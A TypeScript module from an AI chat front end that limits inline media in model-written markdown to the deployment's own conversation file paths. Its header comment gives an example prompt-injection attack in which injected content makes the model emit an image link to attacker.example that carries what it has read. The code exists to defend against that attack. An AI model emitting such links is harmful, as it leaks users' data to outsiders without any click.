// WHERE A PICTURE, A SOUND OR A VIDEO IN AN ANSWER MAY LOAD FROM (2026-10-14, security review
// swx-02). Plain .ts with no imports, so `node --test` reaches it (mediaSource.test.ts).
//
// Markdown written by a model is the one place on the page whose content somebody else can steer: a
// crawled page, a Jira issue or a web result can tell the model to end its answer with
// `![x](https://attacker.example/p.png?d=<what it has read>)`, and an <img> sends that request the
// moment the line streams in, with no click. So an answer, a sub-agent's report, a workflow step
// and a key-account report draw media inline ONLY from this deployment's own conversation files -
// the media the web tools saved, the files the agent wrote, the user's attachments - and anything
// on another host waits for a click that names the host first (`RemoteMedia`). The system prompt
// already tells the model to embed only the `mediaUrl` a tool returned; this makes that the rule
// rather than a request.
//
// Even the own-media pattern is exact rather than "anything under /api/": an <img> GET carries the
// reader's cookies, so a model-written `![x](/api/...)` must not be able to call any other endpoint.

export type MediaKind = 'image' | 'video' | 'audio'

export type MediaSource =
  // This deployment's own file for a conversation - drawn inline, with credentials.
  | { kind: 'own'; path: string }
  // Somewhere else on the web - drawn only after the reader asks, naming `host` first.
  | { kind: 'remote'; url: string; host: string }
  // Neither - a bare name, a local path, another scheme: shown as text.
  | { kind: 'none' }

// /api/v1/chat/conversations/{id}/media|files|attachments/{one name}, and nothing after it. The id
// is a UUID's alphabet; the name is one path segment.
const OWN_MEDIA_RE = /^\/api\/v1\/chat\/conversations\/[A-Za-z0-9-]+\/(media|files|attachments)\/([^/?#\\]+)$/
// `.` and `..` (also percent-encoded) are a path segment the browser resolves upward, to another
// endpoint.
const DOT_SEGMENT_RE = /^(\.|%2e){1,2}$/i

export function mediaSource(raw: string): MediaSource {
  const src = raw.trim()
  const own = OWN_MEDIA_RE.exec(src)
  if (own) return DOT_SEGMENT_RE.test(own[2]) ? { kind: 'none' } : { kind: 'own', path: src }
  if (!/^https?:\/\//i.test(src)) return { kind: 'none' }
  try {
    const url = new URL(src)
    if ((url.protocol !== 'http:' && url.protocol !== 'https:') || !url.host) return { kind: 'none' }
    return { kind: 'remote', url: url.href, host: url.host }
  } catch {
    return { kind: 'none' }
  }
}

// A LINK to a file of a conversation - one the agent wrote, or an upload - opens the file preview,
// which fetches it with the reader's cookies. Held to the same exact shape as media, for the same
// reason: `[x](/api/v1/chat/conversations/../settings/...)` must not become a credentialed fetch of
// some other endpoint. The browser treats `%2e` as a dot too.
const FILE_LINK_RE = /^\/api\/v1\/chat\/conversations\/[A-Za-z0-9-]+\/(files|attachments)\/([^/?#\\]+)$/

export function isConversationFileLink(href: string): boolean {
  const m = FILE_LINK_RE.exec(href)
  return !!m && !DOT_SEGMENT_RE.test(m[2])
}

const VIDEO_EXT_RE = /\.(mp4|webm|mov|m4v)(\?.*)?$/i
const AUDIO_EXT_RE = /\.(mp3|wav|ogg|m4a|flac)(\?.*)?$/i

/** What the address is drawn as, by its extension; a picture unless it says otherwise. */
export function mediaKind(src: string): MediaKind {
  if (VIDEO_EXT_RE.test(src)) return 'video'
  if (AUDIO_EXT_RE.test(src)) return 'audio'
  return 'image'
}
